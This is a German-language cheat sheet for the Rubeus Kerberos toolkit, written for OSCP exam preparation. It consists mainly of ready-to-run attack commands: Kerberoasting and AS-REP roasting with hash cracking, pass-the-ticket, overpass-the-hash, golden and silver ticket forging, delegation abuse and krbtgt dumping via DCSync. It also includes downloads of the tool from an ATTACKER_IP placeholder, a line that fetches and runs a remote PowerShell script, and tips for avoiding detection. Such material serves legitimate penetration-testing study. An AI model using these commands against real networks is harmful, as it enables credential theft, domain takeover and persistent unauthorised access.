# Rubeus - Kerberos Exploitation Toolkit

## Was ist Rubeus?

Rubeus ist ein C# Toolset für Kerberos Interactions und Abuses. Das go-to Tool für Kerberos-basierte Angriffe in Active Directory-Umgebungen.

**Wichtigste Features:**
- Kerberoasting
- AS-REP Roasting
- Pass-the-Ticket (PTT)
- Overpass-the-Hash (PTH)
- Golden/Silver Tickets
- S4U2Self/S4U2Proxy Abuse
- Ticket Extraction & Manipulation

---

## Download & Compilation

### Pre-Compiled Binary
```powershell
# GitHub Releases
https://github.com/GhostPack/Rubeus/releases

# Download
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
```

### Selbst kompilieren
```powershell
# Visual Studio benötigt
git clone https://github.com/GhostPack/Rubeus
cd Rubeus
# In Visual Studio öffnen und kompilieren
# Output: Rubeus\bin\Release\Rubeus.exe
```

---

## File Transfer zum Target

```powershell
# certutil
certutil -urlcache -f http://ATTACKER_IP/Rubeus.exe Rubeus.exe

# PowerShell
IEX(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/Rubeus.exe', 'Rubeus.exe')

# wget
wget http://ATTACKER_IP/Rubeus.exe -O Rubeus.exe

# evil-winrm
upload Rubeus.exe

# SMB
copy \\ATTACKER_IP\share\Rubeus.exe .
```

---

## Basis-Verwendung

```powershell
# Help
.\Rubeus.exe

# Spezifische Command Help
.\Rubeus.exe <command> /help
```

---

## Kerberoasting

### Was ist Kerberoasting?

Request TGS-Tickets für Service-Accounts mit SPNs, offline cracken da sie mit Service-Account-Passwort verschlüsselt sind.

### Standard Kerberoasting

```powershell
# Alle SPNs kerberoasten
.\Rubeus.exe kerberoast

# Output mit /nowrap (für Hashcat)
.\Rubeus.exe kerberoast /nowrap

# Nur für bestimmten User
.\Rubeus.exe kerberoast /user:sqlservice

# Output in File
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Mit erhöhtem OPSEC (nur AES verschlüsselte Tickets)
.\Rubeus.exe kerberoast /aes
```

### Kerberoasting Output verstehen

```powershell
# Output:
Hash                           : $krb5tgs$23$*sqlservice$corp.local$MSSQLSvc/...
# $krb5tgs$23$ = Kerberos TGS-REP (Service Ticket)
# sqlservice = Account name
# corp.local = Domain
```

### Hashes cracken

```bash
# Kali: Hashcat
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# --format=krb5tgs for john
john --format=krb5tgs --wordlist=rockyou.txt hashes.txt
```

---

## AS-REP Roasting

### Was ist AS-REP Roasting?

User ohne Kerberos Pre-Authentication können AS-REP Responses requesten, die mit User-Passwort verschlüsselt sind → offline crackbar.

### AS-REP Roasting Durchführen

```powershell
# Alle AS-REP roastable Users
.\Rubeus.exe asreproast

# Nowrap für Hashcat
.\Rubeus.exe asreproast /nowrap

# Output in File
.\Rubeus.exe asreproast /outfile:asrep_hashes.txt

# Mit User-List
.\Rubeus.exe asreproast /user:victim /domain:corp.local /dc:dc01.corp.local

# Format für Hashcat
.\Rubeus.exe asreproast /format:hashcat
```

### AS-REP Hash cracken

```bash
# Hashcat
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# John
john --wordlist=rockyou.txt asrep_hashes.txt
```

### User ohne Pre-Auth finden (mit PowerView)

```powershell
# PowerView
Get-DomainUser -PreauthNotRequired

# LDAP Query
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}

# Dann mit Rubeus AS-REP roasten
```

---

## Pass-the-Ticket (PTT)

### TGT/TGS Import

```powershell
# Ticket von Kirbi-File importieren
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Base64-Ticket importieren
.\Rubeus.exe ptt /ticket:<base64_ticket>

# Mehrere Tickets
.\Rubeus.exe ptt /ticket:ticket1.kirbi /ticket:ticket2.kirbi
```

### Ticket Extraction

```powershell
# Alle Tickets aus current session dumpen
.\Rubeus.exe dump

# Nur TGTs
.\Rubeus.exe dump /service:krbtgt

# Nur TGS für spezifischen Service
.\Rubeus.exe dump /service:cifs/dc01.corp.local

# Als Base64
.\Rubeus.exe dump /nowrap

# LUID angeben (Logon Session ID)
.\Rubeus.exe dump /luid:0x3e7

# Elevated required für andere Sessions
```

### Ticket verwenden

```powershell
# 1. Ticket dumpen
.\Rubeus.exe dump /service:krbtgt /nowrap

# 2. Ticket importieren
.\Rubeus.exe ptt /ticket:<base64>

# 3. Ticket nutzen (z.B. PSExec)
.\PsExec.exe \\dc01 cmd
```

---

## Overpass-the-Hash (Pass-the-Key)

### Was ist Overpass-the-Hash?

NTLM-Hash oder AES-Key nutzen, um ein Kerberos-Ticket (TGT) zu requesten.

### Mit NTLM Hash

```powershell
# TGT mit NTLM Hash requesten
.\Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /domain:corp.local

# Mit Ausgabe als Base64
.\Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /domain:corp.local /nowrap

# Direkt in Session importieren (/ptt)
.\Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /domain:corp.local /ptt

# DC angeben
.\Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /domain:corp.local /dc:dc01.corp.local /ptt
```

### Mit AES Key

```powershell
# AES256
.\Rubeus.exe asktgt /user:Administrator /aes256:AES256_KEY /domain:corp.local /ptt

# AES128
.\Rubeus.exe asktgt /user:Administrator /aes128:AES128_KEY /domain:corp.local /ptt
```

### Workflow: Hash zu TGT zu Access

```powershell
# 1. Hash bekommen (z.B. via Mimikatz, secretsdump)
# NTLM: a87f3a337d73085c45f9416be5787d86

# 2. TGT requesten & importieren
.\Rubeus.exe asktgt /user:Administrator /rc4:a87f3a337d73085c45f9416be5787d86 /ptt

# 3. Ticket validieren
klist

# 4. Zugriff testen
dir \\dc01\C$
```

---

## Golden Ticket

### Was ist ein Golden Ticket?

Gefälschtes TGT mit krbtgt-Hash. Gibt Domain-weiten Zugriff für beliebige User.

### Golden Ticket erstellen

```powershell
# Benötigt:
# - krbtgt NTLM Hash (von secretsdump/Mimikatz)
# - Domain Name
# - Domain SID
# - Username (beliebig, auch fake)

.\Rubeus.exe golden /rc4:KRBTGT_HASH /domain:corp.local /sid:S-1-5-21-... /user:FakeAdmin /ptt

# Mit AES Key (bevorzugt)
.\Rubeus.exe golden /aes256:KRBTGT_AES256 /domain:corp.local /sid:S-1-5-21-... /user:FakeAdmin /ptt

# Lifetime festlegen
.\Rubeus.exe golden /rc4:KRBTGT_HASH /domain:corp.local /sid:S-1-5-21-... /user:Administrator /startoffset:-10 /endin:600 /renewmax:10080 /ptt
```

### Golden Ticket Parameters

```powershell
/rc4:HASH           # krbtgt NTLM hash
/aes256:KEY         # krbtgt AES256 key (bevorzugt)
/user:USERNAME      # Beliebiger Username
/domain:DOMAIN      # Domain FQDN
/sid:SID            # Domain SID
/ptt                # Direkt in Session importieren
/id:ID              # User RID (default 500 = Administrator)
/groups:GROUPS      # Group RIDs (default 513,512,520,518,519)
/startoffset:NUM    # Start time offset (minutes)
/endin:NUM          # End time (minutes, default 10 years!)
/renewmax:NUM       # Renew time (minutes)
```

---

## Silver Ticket

### Was ist ein Silver Ticket?

Gefälschtes TGS (Service Ticket) für spezifischen Service. Nutzt Service-Account-Hash statt krbtgt.

### Silver Ticket erstellen

```powershell
# Benötigt:
# - Service Account NTLM Hash (z.B. Computer$ account)
# - Domain Name
# - Domain SID
# - Service Principal Name (SPN)

.\Rubeus.exe silver /rc4:MACHINE_ACCOUNT_HASH /domain:corp.local /sid:S-1-5-21-... /user:Administrator /service:cifs/dc01.corp.local /ptt

# Für HTTP Service
.\Rubeus.exe silver /rc4:HASH /domain:corp.local /sid:S-1-5-21-... /user:Administrator /service:http/web01.corp.local /ptt

# Für MSSQL
.\Rubeus.exe silver /rc4:HASH /domain:corp.local /sid:S-1-5-21-... /user:Administrator /service:MSSQLSvc/sql01.corp.local:1433 /ptt
```

### Wichtigste Services für Silver Tickets

```powershell
cifs/HOST       # File sharing (\\host\share)
http/HOST       # HTTP/WinRM
ldap/HOST       # LDAP
mssql/HOST      # MS SQL Server
host/HOST       # All services on host
rpcss/HOST      # WMI
```

---

## S4U2Self / S4U2Proxy Abuse

### Was ist S4U?

Service-for-User Extensions ermöglichen Services, im Namen von Usern zu agieren.

### S4U2Self

```powershell
# Service requestet TGS für sich selbst im Namen eines Users
.\Rubeus.exe s4u /user:serviceaccount /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.corp.local /ptt

# Mit AES
.\Rubeus.exe s4u /user:serviceaccount /aes256:AES_KEY /impersonateuser:Administrator /msdsspn:cifs/target.corp.local /ptt
```

### S4U2Proxy

```powershell
# Delegation abuse
.\Rubeus.exe s4u /user:serviceaccount /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.corp.local /altservice:ldap /ptt
```

---

## Monitoring (OPSEC)

### Aktuelle Tickets ansehen

```powershell
# Native Windows
klist

# Rubeus
.\Rubeus.exe triage

# Detailed
.\Rubeus.exe triage /luid:0x3e7
```

### Ticket löschen

```powershell
# Alle Tickets purgen
.\Rubeus.exe purge

# Spezifisches LUID
.\Rubeus.exe purge /luid:0x3e7
```

---

## Praktische OSCP-Workflows

### Workflow 1: Kerberoasting → Crack → Profit

```powershell
# Windows: Kerberoast
.\Rubeus.exe kerberoast /nowrap /outfile:hashes.txt

# Kali: Crack
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# Gecrackt! Passwort nutzen
evil-winrm -i DC_IP -u sqlservice -p 'CrackedPassword123!'
```

### Workflow 2: AS-REP Roast → Crack → Lateral Movement

```powershell
# Windows: AS-REP Roast
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Kali: Crack
hashcat -m 18200 asrep.txt rockyou.txt

# Lateral movement
impacket-psexec corp.local/john:'CrackedPass'@target-pc
```

### Workflow 3: Overpass-the-Hash (NTLM → TGT → Access)

```powershell
# 1. Hash bekommen (Mimikatz, secretsdump, etc.)

# 2. TGT requesten
.\Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /ptt

# 3. Zugriff nutzen
dir \\dc01\C$
.\PsExec.exe \\dc01 cmd
```

### Workflow 4: Golden Ticket (DA → Persistence)

```powershell
# 1. Als Domain Admin: krbtgt Hash dumpen
.\mimikatz.exe "lsadump::dcsync /user:krbtgt" exit
# Oder: impacket-secretsdump corp.local/admin@dc01

# 2. Domain SID bekommen
whoami /user
# S-1-5-21-123456789-123456789-123456789-1000
# Domain SID: S-1-5-21-123456789-123456789-123456789

# 3. Golden Ticket erstellen
.\Rubeus.exe golden /rc4:KRBTGT_HASH /domain:corp.local /sid:S-1-5-21-... /user:FakeAdmin /ptt

# 4. Zugriff für 10 Jahre!
dir \\dc01\C$
```

---

## Ticket Conversion

### Kirbi ↔ ccache

```bash
# Kirbi zu ccache (für Linux Tools)
# Impacket ticketConverter
ticketConverter.py ticket.kirbi ticket.ccache

# ccache zu kirbi
ticketConverter.py ticket.ccache ticket.kirbi

# Verwenden auf Kali
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k -no-pass corp.local/administrator@dc01.corp.local
```

---

## OPSEC Considerations

### Was Rubeus hinterlässt:

```
- Kerberos Ticket Requests (Event ID 4768, 4769)
- Abnormale Ticket-Anfragen (viele SPNs auf einmal)
- RC4 Encryption bei Kerberoasting (statt AES)
- Golden Ticket: Abnormale Ticket Lifetimes
```

### Leiser machen:

```powershell
# AES statt RC4 für Kerberoasting (weniger auffällig)
.\Rubeus.exe kerberoast /aes

# Einzelne User statt Massen-Kerberoasting
.\Rubeus.exe kerberoast /user:specific_user

# Delay zwischen Requests
# (Rubeus hat kein built-in delay, manuell machen)
```

---

## Troubleshooting

### "KDC_ERR_PREAUTH_REQUIRED"
```
→ Kerberos Pre-Auth ist required
→ Kann nicht AS-REP roasten
→ User hat "Do not require Kerberos preauthentication" nicht gesetzt
```

### "KDC_ERR_S_PRINCIPAL_UNKNOWN"
```
→ Service/User existiert nicht
→ SPN falsch geschrieben
→ Domain/DC-Name überprüfen
```

### "KDC_ERR_BADOPTION"
```
→ Ticket-Optionen nicht erlaubt
→ Bei S4U: Delegation nicht konfiguriert
```

### "Clock skew too great"
```
→ Zeit zwischen Client und DC zu unterschiedlich
→ Zeit synchronisieren: w32tm /resync
```

---

## Alternative/Ergänzende Tools

### Mimikatz
```powershell
# Kerberos-Funktionen
mimikatz # sekurlsa::tickets
mimikatz # kerberos::ptt ticket.kirbi
mimikatz # kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH
```

### Impacket (Linux)
```bash
# Kerberoasting
impacket-GetUserSPNs corp.local/user:pass -request

# AS-REP Roasting
impacket-GetNPUsers corp.local/user:pass -request

# TGT requesten
impacket-getTGT corp.local/user:pass

# Golden Ticket
impacket-ticketer -nthash HASH -domain-sid SID -domain DOMAIN user
```

### Invoke-Kerberoast (PowerShell)
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
Invoke-Kerberoast -OutputFormat Hashcat
```

---

## Quick Reference

### Commands

```powershell
# Kerberoasting
.\Rubeus.exe kerberoast /nowrap

# AS-REP Roasting
.\Rubeus.exe asreproast /format:hashcat

# Overpass-the-Hash
.\Rubeus.exe asktgt /user:USER /rc4:HASH /ptt

# Golden Ticket
.\Rubeus.exe golden /rc4:HASH /domain:DOMAIN /sid:SID /user:USER /ptt

# Silver Ticket
.\Rubeus.exe silver /rc4:HASH /domain:DOMAIN /sid:SID /service:SPN /user:USER /ptt

# Pass-the-Ticket
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Dump Tickets
.\Rubeus.exe dump /nowrap

# Monitor Tickets
.\Rubeus.exe triage

# Purge Tickets
.\Rubeus.exe purge
```

---

## OSCP Exam Tips

1. **Kerberoasting ist Gold** - Oft schnellster Weg zu privilegiertem Account
2. **/nowrap verwenden** - Für Hashcat-kompatible Hashes
3. **AS-REP Roasting prüfen** - Kann vergessen werden, aber lohnt sich
4. **Overpass-the-Hash** - NTLM Hash → TGT → Network Auth möglich
5. **Golden Ticket = Persistence** - Bei DA-Zugriff für Backup
6. **klist nutzen** - Tickets validieren nach Import
7. **Ticket Conversion** - ticketConverter.py für Linux-Tools
8. **Zeit ist wichtig** - Clock skew vermeiden (w32tm /resync)

---

## Resources

- GitHub: https://github.com/GhostPack/Rubeus
- Compiled: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
- AD Security: https://adsecurity.org
- HarmJ0y Blog: http://blog.harmj0y.net/
- HackTricks: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
